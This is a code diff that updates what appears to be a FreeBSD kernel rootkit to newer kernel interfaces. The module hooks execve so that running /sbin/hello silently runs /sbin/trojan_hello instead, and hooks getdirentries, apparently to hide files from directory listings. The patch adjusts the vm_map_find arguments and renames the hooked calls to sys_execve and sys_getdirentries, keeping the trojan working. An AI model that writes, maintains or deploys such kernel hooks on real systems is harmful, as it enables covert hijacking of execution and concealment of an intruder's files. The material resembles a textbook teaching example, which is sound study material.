@@ -69,7 +69,9 @@
 #include <vm/vm_page.h>
 #include <vm/vm_map.h>
 
-#include <dirent.h>
+#include <sys/dirent.h>
+
+
 
 #define ORIGINAL	"/sbin/hello"
 #define TROJAN		"/sbin/trojan_hello"
@@ -109,7 +111,19 @@ execve_hook(struct thread *td, void *syscall_args)
                  * Allocate a PAGE_SIZE null region of memory for a new set
                  * of execve arguments.
                  */
-                vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
+/*
+vm_map_find(vm_map_t map,
+            vm_object_t object,
+            vm_ooffset_t offset,
+            vm_offset_t *addr,  * IN/OUT *
+            vm_size_t length,
+            vm_offset_t max_addr, -> new one 
+            int find_space,
+            vm_prot_t prot,
+            vm_prot_t max,
+            int cow)
+*/
+                vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, 0, FALSE,
                     VM_PROT_ALL, VM_PROT_ALL, 0);
                 vm->vm_dsize += btoc(PAGE_SIZE);
 
@@ -130,10 +144,10 @@ execve_hook(struct thread *td, void *syscall_args)
                 copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
 
                 /* Execute TROJAN. */
-                return(execve(curthread, user_ea));
+                return(sys_execve(curthread, user_ea));
         }
 
-        return(execve(td, syscall_args));
+        return(sys_execve(td, syscall_args));
 }
 
 /*
@@ -158,7 +172,7 @@ getdirentries_hook(struct thread *td, void *syscall_args)
 	 * Store the directory entries found in fd in buf, and record the
 	 * number of bytes actually transferred.
 	 */
-	getdirentries(td, syscall_args);
+	sys_getdirentries(td, syscall_args);
 	size = td->td_retval[0];
 
 	/* Does fd actually contain any directory entries? */
